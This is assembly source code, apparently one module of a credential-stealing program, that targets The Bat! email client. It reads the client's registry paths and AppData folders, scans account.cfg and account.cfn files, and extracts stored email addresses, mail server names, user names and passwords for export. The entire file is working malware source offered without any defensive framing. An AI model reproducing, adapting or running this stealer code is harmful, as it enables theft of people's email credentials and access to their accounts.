; The Bat!
; Tested on:
;	The Bat! 2.10.00
;	The Bat! 2.10.03


.data
	@AllocStr <szTheBatBasePath>,	<"SOFTWARE\RIT\The Bat!">
	@AllocStr <szTheBatWorkDir>,	<"Working Directory">
	@AllocStr <szTheBatProgramDir>, <"ProgramDir">
	@AllocStr <szTheBatAccount>,	<"\account.cfg">
	@AllocStr <szTheBatAccount2>,	<"\account.cfn">
	@AllocStr <szTheBatAppDataDir>, <"\BatMail\">
	@AllocStr <szTheBatAppDataDir2>,<"\The Bat!\">
	@AllocMem <lpTheBatCommonBuf>,	<MAX_PATH+1>

.code

LoadTheBatParam proc dwType: DWORD
	lodsd
	push	eax
	invoke	ExportData, dwType, 0, esi, eax
	pop	eax
	ret
LoadTheBatParam endp

GetTheBatPass proc uses esi
	LOCAL	hMap: MappedFile

	invoke	MapFile, offset lpTheBatCommonBuf, addr hMap
	.IF	eax
		mov	ecx, 20h
		mov	esi, hMap.lpMem
		
	@l:
		lodsd	; seq
		xchg	eax, edx
		lodsd	; len
		
		push	ecx
		.IF	edx == 02h
			invoke	LoadTheBatParam, TYPE_TB_EMAIL
		.ELSEIF	edx == 0bh
			invoke	LoadTheBatParam, TYPE_TB_SERV 
		.ELSEIF	edx == 0fh
			invoke	LoadTheBatParam, TYPE_TB_USER
		.ELSEIF edx == 10h
			invoke	LoadTheBatParam, TYPE_TB_PASS
		.ENDIF	
		pop	ecx
		add	esi, eax
		
		loop	@l
	.ENDIF 
	invoke	UnmapFile, addr hMap
	
	ret
GetTheBatPass endp

GetTheBatPass2 proc uses esi edi ebx
	LOCAL	hMap: MappedFile
	LOCAL	tLen, cMaxOffs: DWORD

	invoke	MapFile, offset lpTheBatCommonBuf, addr hMap
	.IF	eax
		mov	esi, hMap.lpMem
		mov	cMaxOffs, esi
		mov	eax, hMap.dwFileSize
		add	cMaxOffs, eax	
		
		lodsd ; index_num
		mov	ecx, eax
		jecxz	@gtbp2_unmap
		
		; Calc offset to the stored data
		xor	edx, edx
		mov	ebx, 13
		mul	ebx
		add	eax, 8
		mov	tLen, eax
		add	tLen, esi
		
	@l_idx:
		lodsb ; flag: 0x00 - valid
		.IF	!al
			lodsd	; seq
			mov	ebx, eax
			lodsd	; offset
			mov	edi, tLen
			add	edi, eax
			lodsd	; len
			
			; Check for overflow
			push	edi
			add	edi, eax
			.IF	edi > cMaxOffs
				pop	edi
				jmp	@gtbp2_unmap	
			.ENDIF
			pop	edi 
			
			.IF	(ebx == 000081A7h) || (ebx == 000081A6h) || (ebx == 00008179h) || (ebx == 00008159h)
				push	ecx
				invoke	ExportData, TYPE_TB_NEW, ebx, edi, eax
				pop	ecx
			.ENDIF
		.ELSE
			add	esi, 3*4
		.ENDIF
		loop	@l_idx
		
	.ENDIF
	
@gtbp2_unmap:
	invoke	UnmapFile, addr hMap
	ret
GetTheBatPass2 endp

ScanTheBatDir proc uses edi
	LOCAL   FindFileData: WIN32_FIND_DATA
	LOCAL   hFind: DWORD
                
	invoke	lstrlen, offset lpTheBatCommonBuf
	lea	edi, [eax+offset lpTheBatCommonBuf]
	mov	dword ptr[edi], '*.*'
        
	invoke  FindFirstFile, offset lpTheBatCommonBuf, addr FindFileData
	mov     hFind, eax
	inc     eax
	jz      @ret	
        
@find_loop:                
        cmp	FindFileData.cFileName[0], '.'
        jz	@level_up_skip
        
        ; account.cfg
        invoke  lstrcpy, edi, addr FindFileData.cFileName
        invoke	lstrcat, offset lpTheBatCommonBuf, offset szTheBatAccount
        invoke	GetTheBatPass
        
        ; account.cfn
	invoke  lstrcpy, edi, addr FindFileData.cFileName
        invoke	lstrcat, offset lpTheBatCommonBuf, offset szTheBatAccount2
        invoke	GetTheBatPass2

@level_up_skip:
	invoke  FindNextFile, hFind, addr FindFileData
	test    eax, eax
	jnz	@find_loop

	invoke  FindClose, hFind

@ret:
	ret
ScanTheBatDir endp

ScanTheBatAppData proc lpPath: DWORD
	.IF	dwSHGetFolderPath
		push	offset lpTheBatCommonBuf
		push	0
		push	NULL
		push	CSIDL_APPDATA
		push	NULL
		call	dwSHGetFolderPath
		.IF	eax == S_OK
			invoke	lstrcat, offset lpTheBatCommonBuf, lpPath  
			invoke	ScanTheBatDir
		.ENDIF
	.ENDIF
	ret
ScanTheBatAppData endp

GetTheBatOutput proc
	LOCAL	dwBufSize: DWORD

	; Write header	
	invoke	ExportModule, MODULE_THE_BAT
	
	; The Bat! 2.12
	invoke	ScanTheBatAppData, offset szTheBatAppDataDir
	invoke	ScanTheBatAppData, offset szTheBatAppDataDir2
	
	; Query the HKCU->Software->RIT->Working Directory	
	mov	dwBufSize, MAX_PATH
	invoke	RegReadValue, HKEY_CURRENT_USER, offset szTheBatBasePath, offset szTheBatWorkDir, offset lpTheBatCommonBuf, addr dwBufSize 
	.IF	eax
		invoke	ExpandEnvVars, offset lpTheBatCommonBuf, MAX_PATH
		invoke	ScanTheBatDir
	.ENDIF
	
	; Query the HKCU->Software->RIT->ProgramDir
	mov	dwBufSize, MAX_PATH
	invoke	RegReadValue, HKEY_CURRENT_USER, offset szTheBatBasePath, offset szTheBatProgramDir, offset lpTheBatCommonBuf, addr dwBufSize 
	.IF	eax
		invoke	ExpandEnvVars, offset lpTheBatCommonBuf, MAX_PATH
		invoke	ScanTheBatDir
	.ENDIF

@ret:	
	ret
GetTheBatOutput endp
